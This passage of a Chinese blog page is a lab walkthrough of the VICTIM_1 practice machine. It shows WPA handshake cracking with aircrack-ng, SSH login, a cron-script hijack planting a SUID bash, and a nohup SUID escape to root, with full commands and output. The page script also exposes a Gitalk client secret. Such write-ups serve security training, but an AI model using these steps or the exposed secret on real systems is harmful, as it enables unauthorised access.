class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.<span class="hljs-built_in">cap</span> <br>Reading packets, please <span class="hljs-built_in">wait</span>...<br>Opening WPA-01.<span class="hljs-built_in">cap</span><br>Resetting EAPOL Handshake decoder state.<br>Read 1918 packets.<br><br>   <span class="hljs-comment">#  BSSID              ESSID                     Encryption</span><br><br>   1  5C:D9:98:5A:B6:62  dlink                     WPA (1 handshake)<br><br>Choosing first network as target.<br><br>Reading packets, please <span class="hljs-built_in">wait</span>...<br>Opening WPA-01.<span class="hljs-built_in">cap</span><br>Resetting EAPOL Handshake decoder state.<br>Read 1918 packets.<br><br>1 potential targets<br><br><br>                               Aircrack-ng 1.7 <br><br>      [00:00:14] 70447/14344392 keys tested (4872.59 k/s) <br><br>      Time left: 48 minutes, 49 seconds                          0.49%<br><br>                           KEY FOUND! [ p4ssword ]<br><br><br>      Master Key     : 8F C0 1B 1B 85 06 0B 85 23 7C 83 74 F8 4B 4A FD <br>                       50 CE EC 72 6F 85 17 5F B1 14 5E D2 F2 47 5D 1A <br><br>      Transient Key  : 13 41 36 81 4A 92 19 CF EC 14 B8 FD 20 2C D4 2E <br>                       BA A1 95 79 CE 15 5F 1A 2C DE 03 A8 2B 52 68 64 <br>                       D3 77 A7 E4 FF CD 49 0C ED E9 5E 3B 68 E6 83 26 <br>                       06 0C 98 8D 43 B6 7C E4 FE ED 2E 45 90 0D 6D 15 <br><br>      EAPOL HMAC     : 33 A5 CE E2 46 DB 4B 96 86 A1 6E D9 D2 A2 A6 E9 <br></code></pre></td></tr></table></figure>
+
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>找到了密码 <code>p4ssword</code>，但是有个问题，不知道用户名……，从网站里又翻找了半天，还是没找到，最后看了眼 WP，原来 dlink 就是用户名。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ ssh dlink@192.168.56.120  <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.120 (192.168.56.120)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:ePua4qlxyyVdR3vIDdxTLN/vcsunu7mAZICrDcLW8m0.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.120<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">dlink@192.168.56.120\&#x27;</span>s password: <br>Last login: Tue Apr  7 23:36:49 2020 from 192.168.86.99<br>dlink@victim01:~$ <span class="hljs-built_in">whoami</span><br>dlink<br>dlink@victim01:~$ <span class="hljs-built_in">ls</span> -liah<br>total 20K<br>152513 drwxr-xr-x 2 dlink dlink 4.0K Apr 22  2020 .<br>131074 drwxr-xr-x 4 root  root  4.0K Apr  7  2020 ..<br>153736 lrwxrwxrwx 1 dlink dlink    9 Apr  7  2020 .bash_history -&gt; /dev/null<br>153733 -rw-r--r-- 1 dlink dlink  220 Apr  7  2020 .bash_logout<br>152516 -rw-r--r-- 1 dlink dlink 3.7K Apr  7  2020 .bashrc<br>153734 -rw-r--r-- 1 dlink dlink  807 Apr  7  2020 .profile<br>dlink@victim01:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:ce:<span class="hljs-built_in">fc</span>:4b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.120/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 528sec preferred_lft 528sec<br>    inet6 fe80::a00:27ff:fece:fc4b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>dlink@victim01:~$ <span class="hljs-built_in">uname</span> -a<br>Linux victim01 4.15.0-96-generic <span class="hljs-comment">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>dlink@victim01:~$ sudo -l<br>User dlink may run the following commands on localhost:<br>    (ALL) NOPASSWD: /usr/bin/TryHarder!<br>dlink@victim01:~$ <span class="hljs-built_in">ls</span> -liah /usr/bin/TryHarder!<br><span class="hljs-built_in">ls</span>: cannot access <span class="hljs-string">&#x27;/usr/bin/TryHarder!&#x27;</span>: No such file or directory<br><br></code></pre></td></tr></table></figure>
+
+<p><code>sudo -l</code> 的结果中又被戏耍了，看一看 bin 目录的权限，无法写个同名的文件进去。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>看看别的吧，定时任务呢</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/usr/bin$ <span class="hljs-built_in">cat</span> /etc/crontab<br>* * * * * /tmp/script.sh<br></code></pre></td></tr></table></figure>
+
+<p>调用了一个 sh 文件，tmp 目录又空空如也且可控，我们写个 script.sh 进去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&quot;</span> &gt; script.sh<br></code></pre></td></tr></table></figure>
+
+<p>等了半天也没被运行……搜了一下，感觉可能是脚本中没有环境变量的问题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hyfstyle/article/details/100521248">Linux 定时任务没有执行_linux定时任务没有执行_hyfstyle的博客-CSDN博客</a></p>
+<p><img src="/pic/338a98313194eab353fafe5e007d7fd1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>出现的一个疑问</p>
+</blockquote>
+<p><img src="/pic/kali-linux-2022.1-vmware-amd64-2023-06-29-22-14-27.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看 s 权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/tmp$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>    11165    376 -rwsr-xr--   1 root     dip        382696 Feb 11  2020 /usr/sbin/pppd<br>      676     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec<br>     1173     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newuidmap<br>     2278     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn<br>     1172     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newgidmap<br>      469     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp<br>     2226    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo<br>      950     36 -rwsr-xr-x   1 root     root        35000 Jan 18  2018 /usr/bin/nohup<br>     2279     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh<br>     2471     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils<br>      690     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at<br>     2282     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd<br>     2281     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd<br>    10977     24 -rwsr-xr-x   1 root     root        22528 Jun 28  2019 /usr/bin/arping<br>    11027    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>     6886     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>      702     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>     7602    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>     1316     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>      512    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine<br>   393274     44 -rwsr-xr-x   1 root     root          43088 Mar  5  2020 /bin/mount<br>   393281     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su<br>   393282     28 -rwsr-xr-x   1 root     root          26696 Mar  5  2020 /bin/umount<br>   393601     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping<br>   393285     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount<br></code></pre></td></tr></table></figure>
+
+<p>先尝试 helper 提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/tmp$ systemd-run -t bash<br>Failed to start transient service unit: Interactive authentication required.<br></code></pre></td></tr></table></figure>
+
+<h3 id="nohup-suid-提权"><a href="#nohup-suid-提权" class="headerlink" title="nohup suid 提权"></a>nohup suid 提权</h3><p>借助于 gtfobins</p>
+<p><img src="/pic/1d097e3d83a5b88047258051bf60a815_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/tmp$ /usr/bin/nohup /bin/sh -p -c <span class="hljs-string">&quot;sh -p &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&quot;</span><br>/usr/bin/nohup: ignoring input and appending output to <span class="hljs-string">&#x27;nohup.out&#x27;</span><br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=1002(dlink) gid=1004(dlink) euid=0(root) <span class="hljs-built_in">groups</span>=1004(dlink)<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>flag.txt  snap<br><span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:ce:<span class="hljs-built_in">fc</span>:4b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.120/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 599sec preferred_lft 599sec<br>    inet6 fe80::a00:27ff:fece:fc4b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br>Linux victim01 4.15.0-96-generic <span class="hljs-comment">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-comment"># cat flag.txt</span><br>Nice work!<br><br>                .:<span class="hljs-comment">##:::.</span><br>              .:::::/;;\:.<br>        ()::::::@::/;;<span class="hljs-comment">#;|:.</span><br>        ::::<span class="hljs-comment">##::::|;;##;|::</span><br>         <span class="hljs-string">&#x27;:::::::::\;;;/::&#x27;</span><br>              <span class="hljs-string">&#x27;:::::::::::</span><br><span class="hljs-string">               |O|O|O|O|O|O</span><br><span class="hljs-string">               :#:::::::##::.</span><br><span class="hljs-string">              .:###:::::#:::::.</span><br><span class="hljs-string">              :::##:::::::::::#:.</span><br><span class="hljs-string">               ::::;:::::::::###::.</span><br><span class="hljs-string">               &#x27;</span>:::;::<span class="hljs-comment">###::;::#:::::</span><br>                ::::;::<span class="hljs-comment">#::;::::::::::</span><br>                :<span class="hljs-comment">##:;::::::;::::###:::     .</span><br>              .:::::; .:::<span class="hljs-comment">##::::::::::::::::</span><br>              ::::::; :::::::::::::::::<span class="hljs-comment">##::  #rootdance</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>VICTIM_1 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/06/10ac18445f7e.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/4a8e45e98015.html" title="DPWWN_2 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DPWWN_2 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/a671dd67ea4a.html" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '446fe1f18eaed40836bae9672061dc43'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
